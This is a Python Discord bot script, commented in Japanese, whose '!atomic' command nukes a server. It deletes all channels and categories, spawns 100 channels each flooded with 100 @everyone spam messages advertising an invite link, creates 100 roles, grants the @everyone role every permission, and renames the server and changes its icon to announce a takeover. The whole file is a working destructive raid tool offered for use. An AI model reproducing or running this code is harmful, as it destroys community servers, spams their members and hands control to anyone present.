import discord
from discord.ext import commands
import aiohttp
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print("Botは正常に起動しました！")
    print(bot.user.name)
    print(bot.user.id)  
    print(discord.__version__) 
    print('------')
    activity = discord.Game(name='オンラインステータス')  
    await bot.change_presence(activity=activity)

@bot.command()
async def atomic(ctx):
    async def arasi():
        tasks = []
        for i in range(100):
            channel = await ctx.guild.create_text_channel('ユキナ共和国によって乗っ取られました')
            tasks.append(asyncio.create_task(message(channel)))

        await asyncio.gather(*tasks)

    async def message(channel):
        for _ in range(100):
            await channel.send('@everyone\nユキナ共和国に今すぐ参加！\nhttps://discord.gg/3ksgaswpcn')

    async def delete():
        for channel in ctx.guild.channels:
            await channel.delete()

    async def delete_kategori():
        for category in ctx.guild.categories:
            await category.delete()

    async def role():
        for i in range(100):
            role = await ctx.guild.create_role(name='ユキナ共和国最高！')  

    async def admin():
        everyone_role = discord.utils.get(ctx.guild.roles, name='@everyone')
        await everyone_role.edit(permissions=discord.Permissions.all())

    async def sabaname():
        await ctx.guild.edit(name='このサーバーはユキナ共和国によって乗っ取られました') 

    async def icon():
        icon_url = 'https://cdn.discordapp.com/attachments/1139792949522206781/1193715678549647512/melon.png?ex=65adb95b&is=659b445b&hm=c23bb53a447d0449714c0d78bcc3a4f93abb762df1e865d799ea9cd5f1670792&'
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_url) as response:
                icon_data = await response.read()
                await ctx.guild.edit(icon=icon_data)

    await delete()
    print('All channels deleted.')  
    await asyncio.gather(delete_kategori(), role(), arasi(), admin(), sabaname(), icon())

bot.run('おまえのtoken')